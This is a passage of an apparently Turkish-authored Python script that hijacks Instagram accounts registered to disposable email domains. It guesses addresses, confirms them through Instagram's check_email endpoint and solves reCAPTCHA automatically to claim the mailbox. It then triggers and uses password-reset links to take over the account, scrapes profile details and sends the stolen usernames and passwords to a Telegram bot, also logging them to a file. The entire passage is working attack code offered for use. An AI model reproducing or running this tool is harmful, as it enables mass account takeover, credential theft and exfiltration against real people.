                        if username_match:
                            username = username_match.group(1)
                            print("\n user:")
                            print(username)
                            print("=" * 50)

                        if reset_link and username:
                            
                            reset_result = reset_instagram_password(reset_link)

                            # Kullanıcı bilgilerini çek
                            print(f"[+] Fetching account info for: {username}")
                            info = process_username(username)

                            if info:
                                followers_count = info['followers']
                                following_count = info['following']
                                full_name = info['full_name']
                                is_private_str = info['is_private']  # "Evet" veya "Hayır"
                                is_private_bool = (is_private_str == "Evet")
                                is_verified_str = info['is_verified']
                                is_verified_bool = (is_verified_str == "Evet")
                                posts_count = info['posts']
                                join_date = info['join_date']
                                location = info['location']
                                user_id_str = info['user_id']
                                bio = info['bio']
                                is_business_str = info['is_business']
                                is_business_bool = (is_business_str == "Evet")
                                category = info['category']
                                public_email = info['public_email']
                                external_url = info['external_url']
                                year_from_id = info['year_from_id']

                                # additional_info dict'i ile uyum için
                                additional_info = {
                                    'biography': bio,
                                    'user_id': user_id_str,
                                    'external_url': external_url,
                                    'email': public_email,
                                    'category': category,
                                    'year_from_id': year_from_id,
                                }
                            else:
                                followers_count = 0
                                following_count = 0
                                full_name = 'N/A'
                                is_private_bool = False
                                is_verified_bool = False
                                posts_count = 0
                                join_date = 'Alinamadi'
                                location = 'Alinamadi'
                                user_id_str = 'N/A'
                                bio = ''
                                is_business_bool = False
                                category = '-'
                                public_email = ''
                                external_url = ''
                                year_from_id = 'x'
                                additional_info = {
                                    'biography': '',
                                    'user_id': 'N/A',
                                    'external_url': '',
                                    'email': '',
                                    'category': '-',
                                    'year_from_id': 'x',
                                }

                            donr += 1

                            
                            if reset_result and reset_result.get('success'):
                                # @AtlasPy 
                                ff = f'''⋘─────━𓆩𝐀𝐓𝐋𝐀𝐒𓆪‏━─────⋙
~ Hits: {donr}
~ Full Name: {full_name}
~ Username: @{username}
~ Password: `{reset_result['password']}`
~ Email: {eml}
~ Followers: {followers_count:,}
~ Following: {following_count:,}
~ Post: {posts_count}
~ Bio: {additional_info['biography'] if additional_info and additional_info.get('biography') else 'Boş'}
~ Private: {"True" if is_private_bool else "False"}
~ Date: {join_date}
~ Country: {location}
~ Meta: {"True" if is_verified_bool else "False"}
~ Business: {"True" if is_business_bool else "False"}
~ Verified: {"True" if is_verified_bool else "False"}
~ Link: https://www.instagram.com/{username}
⋘─────━𓆩𝐀𝐓𝐋𝐀𝐒𓆪‏━─────⋙
Dev: @PyAtlas / @AtlasxPython'''
                            else:
                                
                                ff = f'''⋘─────━𓆩𝐀𝐓𝐋𝐀𝐒𓆪‏━─────⋙
~ Hits: {donr}
~ Full Name: {full_name}
~ Username: @{username}
~ Email: {eml}
~ Followers: {followers_count:,}
~ Following: {following_count:,}
~ Post: {posts_count}
~ Bio: {additional_info['biography'] if additional_info and additional_info.get('biography') else 'Boş'}
~ Gizli: {"True" if is_private_bool else "False"}
~ Tarih: {join_date}
~ Country: {location}
~ Meta: {"True" if is_verified_bool else "False"}
~ Business: {"True" if is_business_bool else "False"}
~ Verified: {"True" if is_verified_bool else "False"}
~ Link: https://www.instagram.com/{username}
⋘─────━𓆩𝐀𝐓𝐋𝐀𝐒𓆪‏━─────⋙
Dev: {dev_name} / {channel_name}'''

                            message = ff
                            url = f"https://api.telegram.org/bot{token}/sendMessage"
                            data = {
                                "chat_id": chid,
                                "text": message
                            }
                            response = requests.post(url, data=data)
                            with open('/storage/emulated/0/Hi2hits.txt', "a", encoding="utf-8") as f:
                                f.write(f"{eml} | {username} | {reset_result.get('password', 'N/A') if reset_result and reset_result.get('success') else 'Failed'} | followers:{followers_count} | year:{join_date} | country:{location}\n")
                            print("[✓] Saved to Hi2hits.txt")

                            ws.close()
                            return None, None

                except json.JSONDecodeError:
                    pass

        except Exception as e:
            print("❌ Closed:", e)
            break

    if i >= 5 and (not reset_link or not username):
        dead += 1
        print(f"\n[!] No reset link or username found after {i} attempts. Deleting email: {eml}")

    ws.close()
    return None, None



gm = 0

def check_email(email):
    global bi, hit, be, gm
    siteKey = '6LfEUPkgAAAAAKTgbMoewQkWBEQhO2VPL4QviKct'
    siteUrl = 'https://hi2.in/'
    userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36'

    request_kwargs = {}

    site_html = requests.get(siteUrl, **request_kwargs).text

    try:
        renderUrl = re.findall(r'''"https://[^"]+\.js"''', site_html)[0].strip('"')
    except:
        renderUrl = 'https://www.google.com/recaptcha/api2/recaptcha__en.js'

    js = requests.get(renderUrl, **request_kwargs).text

    match = re.search(r"po\.src\s*=\s*'(https://[^']+)';", js)

    if match:
        v = match.group(1).split('/')[5]
        api = renderUrl.split('.js')[0]
        if 'api2' not in api and 'enterprise' not in api:
            api += '2'
    else:
        v = renderUrl.split('/')[5]
        api = 'https://www.google.com/recaptcha/api2'

    site = requests.get('https://www.google.com', **request_kwargs)
    cookies = site.cookies

    headers = {
        "accept": "/",
        "accept-language": "en-US,en;q=0.9",
        "origin": "https://www.google.com",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": userAgent
    }

    domain = siteUrl.split('/')[2]
    co = base64.b64encode((f'https://{domain}:443').encode()).decode().replace('=', '.')

    anchor_params = {
        'ar': '1',
        'k': siteKey,
        'co': co,
        'hl': 'en',
        'v': v,
        'size': 'invisible',
        'cb': 'abc123'
    }

    headers['referer'] = siteUrl

    anchor = requests.get(f'{api}/anchor', params=anchor_params, headers=headers, cookies=cookies, **request_kwargs).text
    recaptcha_token = anchor.split('recaptcha-token" value="')[1].split('"')[0]

    reload_headers = headers.copy()
    reload_headers.pop('content-type', None)

    reload_data = {
        'v': v,
        'co': co,
        'reason': 'q',
        'size': 'invisible',
        'hl': 'en',
        'k': siteKey,
        'c': recaptcha_token,
        'chr': '',
        'vh': '',
        'bg': ''
    }

    reload = requests.post(f'{api}/reload?k={siteKey}', data=reload_data, headers=reload_headers, cookies=cookies, **request_kwargs).text
    final_token = reload.split('"rresp","')[1].split('"')[0]

    prefix, domin = email.split('@')

    headers2 = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://hi2.in',
        'referer': 'https://hi2.in/',
        'user-agent': userAgent
    }

    data = {
        'domain': domin,
        'prefix': prefix,
        'recaptcha': final_token
    }

    rss = requests.post('https://hi2.in/api/custom', headers=headers2, data=data, **request_kwargs)
    rs = rss.json()
    print(rs)
    if "hash" in rss.text:
        eml = rs.get('email')
        hash_val = rs.get('hash')
        ex = rs.get('expiry')

        getu(eml, hash_val, ex)

        with open('/storage/emulated/0/Download/etc.txt', 'a', encoding='utf-8') as f:
            f.write(f"{eml}\n")

        print(f"\n Good Email -: {eml}")

        gm += 1
        message = f"✅ Good Email: {eml}"

    else:
        be += 1


def em(email):
    global bi, hit, be, dead, gi, donr, don, gm

    try:
        with httpx.Client(http2=True, timeout=30) as client:
            res = client.post(
                "https://i.instagram.com/api/v1/users/check_email/",
                data=f"email={email}",
                headers={
                    'User-Agent': "Instagram 166.0.0.30.120 Android (30/11; 1440dpi; 2560x1440; samsung; SM-G973F; x86_64; tablet; en_US; kirin)",
                    'content-type': "application/x-www-form-urlencoded; charset=UTF-8"
                }
            ).json()

        if res.get('error_type') == 'email_is_taken':
            check_email(email)
            gi += 1

        else:
            bi += 1

            print(f'''\n{green}Hits: {white}{donr} // {red}Bad İnsta: {white}{bi} // {yellow}Bad Hi2in: {white}{be}''')

    except Exception as e:
        print(f"Error: {e}")


def qq():
    ema = random.choice(['hi2.in', 'telegmail.com'])
    letters = "abcdefghijklmnopqrstwvwxyzuxyz"
    ail = "".join(random.choice(letters) for _ in range(1))
    cil = "".join(random.choice(letters) for _ in range(6))
    if cl == 1:
        email = cil + '@' + 'hi2.in'
    elif cl == 2:
        email = cil + '@' + 'telegmail.com'
    elif cl == 3:
        email = cil + '@' + ema
    em(email)


def worker():
    while True:
        qq()




threads_count = 15

startup()

with ThreadPoolExecutor(max_workers=threads_count) as executor:
    for _ in range(threads_count):
        executor.submit(worker)
